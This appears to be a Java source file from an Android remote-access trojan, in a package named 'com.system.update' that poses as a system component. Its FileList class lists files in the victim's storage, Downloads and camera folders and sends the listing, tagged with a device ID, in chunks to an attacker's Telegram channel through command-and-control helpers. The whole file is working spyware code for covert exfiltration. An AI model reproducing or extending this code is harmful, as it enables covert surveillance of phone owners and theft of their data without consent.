package com.system.update;

import android.content.Context;
import android.os.Environment;

import java.io.File;

/** Directory listing → Telegram (public RAT file-manager pattern). */
public final class FileList {
    private FileList() {}

    public static void run(Context ctx) {
        new Thread(() -> {
            try {
                StringBuilder sb = new StringBuilder();
                sb.append("📁 FILES id=").append(C2.getDeviceId()).append('\n');
                File[] roots = {
                        Environment.getExternalStorageDirectory(),
                        Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS),
                        Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM),
                        ctx.getExternalFilesDir(null)
                };
                for (File root : roots) {
                    listDir(root, sb, 0, 2, 80);
                }
                flush(sb);
            } catch (Throwable t) {
                Telegram.reportEvent(C2.getDeviceId(), "files_err:" + t.getMessage());
            }
        }, "files").start();
    }

    private static void listDir(File dir, StringBuilder sb, int depth, int maxDepth, int limit) {
        if (dir == null || !dir.exists() || depth > maxDepth || limit <= 0) return;
        File[] list = dir.listFiles();
        if (list == null) return;
        int n = 0;
        for (File f : list) {
            if (n++ > 40) break;
            for (int i = 0; i < depth; i++) sb.append("  ");
            sb.append(f.isDirectory() ? "[D] " : "[F] ")
                    .append(f.getName());
            if (f.isFile()) sb.append(" (").append(f.length()).append(')');
            sb.append('\n');
            if (f.isDirectory() && depth < maxDepth) {
                listDir(f, sb, depth + 1, maxDepth, limit - 1);
            }
        }
    }

    private static void flush(StringBuilder sb) {
        String all = sb.toString();
        int pos = 0, part = 1;
        while (pos < all.length() && part <= 12) {
            int end = Math.min(pos + 3200, all.length());
            Telegram.send(part == 1 ? all.substring(pos, end) : "[" + part + "]\n" + all.substring(pos, end));
            pos = end;
            part++;
            try { Thread.sleep(250); } catch (InterruptedException ignored) {}
        }
    }
}
